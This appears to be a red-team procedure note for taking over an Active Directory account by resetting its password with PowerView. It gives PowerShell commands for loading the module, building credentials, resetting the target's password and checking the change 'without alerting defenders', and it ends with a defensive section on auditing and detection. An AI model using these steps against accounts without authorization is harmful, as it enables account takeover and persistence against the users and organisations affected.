---
type: procedure
tactics:
  - '[[Credential Access]]'
  - '[[Persistence]]'
techniques:
  - '[[Account Manipulation]]'
sub_techniques: []
tags:
  - active-directory
  - powershell
commands:
  - '[[commands/powershell-import-powerview]]'
  - '[[commands/powershell-create-secure-string]]'
  - '[[commands/powershell-create-pscredential-object]]'
  - '[[commands/powerview-set-domain-user-password]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerView]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Change AD Domain User Password

## Summary

This procedure demonstrates how to change the password of an Active Directory domain user using the PowerView PowerShell module. It requires credentials from an account with sufficient privileges, such as Domain Admin or delegated reset permissions, to modify the target user's password. This technique can be used for persistence by taking control of another user's account or for lateral movement after compromising an authorized account.

## Description

Active Directory password changes are typically performed via tools like PowerShell's ActiveDirectory module or native commands, but PowerView provides a flexible, script-based alternative for offensive operations. The procedure involves loading the PowerView module, creating secure credential objects for authentication and the new password, and then invoking the Set-DomainUserPassword function, which uses underlying ADSI calls to perform an LDAP password modify operation on the target user. This works in domain-joined Windows environments with network access to a Domain Controller. Success grants the attacker control over the target account using the new password, but it may trigger auditing if password change events are logged.

## Requirements

1. A Windows machine with PowerShell 2.0+ and network connectivity to the Active Directory domain (e.g., domain-joined or via RPC/DNS resolution to DC).
2. The PowerView.ps1 script downloaded from its GitHub repository.
3. Credentials of an account authorized to reset passwords for the target user (e.g., member of Domain Admins, Account Operators, or custom ACL permissions on the user object).
4. A new password that complies with the domain's password policy (length, complexity).

## Defense

- Enable advanced auditing for account management events (Event ID 4724 for password resets) on Domain Controllers and monitor via SIEM.
- Use Group Managed Service Accounts (gMSAs) or restrict password reset rights through fine-grained ACLs on user objects.
- Implement Protected Users group to prevent credential caching and limit delegation.
- Detect anomalous PowerShell execution with unusual module loads (e.g., via AMSI or Script Block Logging) and network patterns to LDAP ports (389/636).

## Objectives

1. Load the necessary PowerView module to enable AD modification functions.
2. Authenticate with privileged credentials to gain authorization for the password change.
3. Apply the new password to the target user account for subsequent access or persistence.
4. Verify the change without alerting defenders through direct logon testing.

## Instructions

### Step 1: Import PowerView Module

**Context**: PowerView must be loaded into the current PowerShell session to access its AD manipulation functions. This step sources the script file after downloading it to a local path.

**Command** ([[commands/powershell-import-powerview]]):
```powershell
. $_PATH_TO_POWERVIEW
```

> This command dot-sources the PowerView.ps1 file, making functions like Set-DomainUserPassword available. Replace $_PATH_TO_POWERVIEW with the local file path (e.g., C:\temp\PowerView.ps1). Expected output is none if successful; errors indicate path issues or syntax problems in the script.

### Step 2: Create Secure String for Authorized User Password

**Context**: Convert the authorized account's password to a secure string format required for credential creation, ensuring it can be used securely in subsequent authentication steps.

**Command** ([[commands/powershell-create-secure-string]]):
```powershell
$AuthPass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
```

> This creates a System.Security.SecureString object from the plain-text password. No output is produced on success. Use this for the account that has reset privileges.

### Step 3: Create PSCredential Object for Authentication

**Context**: Combine the domain, username, and secure password into a PSCredential object to authenticate the PowerView operation against the domain.

**Command** ([[commands/powershell-create-pscredential-object]]):
```powershell
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_DOMAIN\$_USER", $AuthPass
```

> This constructs the credential using the previously created secure string. Expected output is none; the $Cred variable holds the object. Parameters include the domain-qualified username (e.g., CONTOSO\admin).

### Step 4: Create Secure String for New Target Password

**Context**: Prepare the new password for the target user in secure string format to pass to the reset function, ensuring compliance with policy before application.

**Command** ([[commands/powershell-create-secure-string]]):
```powershell
$NewPassword = ConvertTo-SecureString -String "$_NEW_PASSWORD" -AsPlainText -Force
```

> Similar to Step 2, but for the desired new password. No output on success. Ensure $_NEW_PASSWORD meets domain complexity requirements to avoid errors.

### Step 5: Reset the Target User's Password

**Context**: Use the authenticated credentials and new password to modify the target user's account via PowerView's LDAP interface, achieving the password change.

**Command** ([[commands/powerview-set-domain-user-password]]):
```powershell
Set-DomainUserPassword -Identity $_TARGET_USER -AccountPassword $NewPassword -Credential $Cred
```

> This function performs the password reset. Expected output: "Password set successfully" or similar confirmation if successful; errors if insufficient privileges or invalid target. The target user (e.g., alice) must exist in the domain.

### Step 6: Verify the Password Change

**Context**: Test the new password by attempting a simple authentication or query to confirm the change without full logon, minimizing detection.

**Instructions**: Use Get-DomainUser to query the target and check last password change timestamp, or attempt a non-interactive auth with the new creds.

```powershell
Get-DomainUser -Identity $_TARGET_USER -Credential $NewCred | Select LastLogonDate, PasswordLastSet
```

> Expected output: Updated PasswordLastSet timestamp matching the current time, confirming the change. Create $NewCred similarly using the new password for testing.
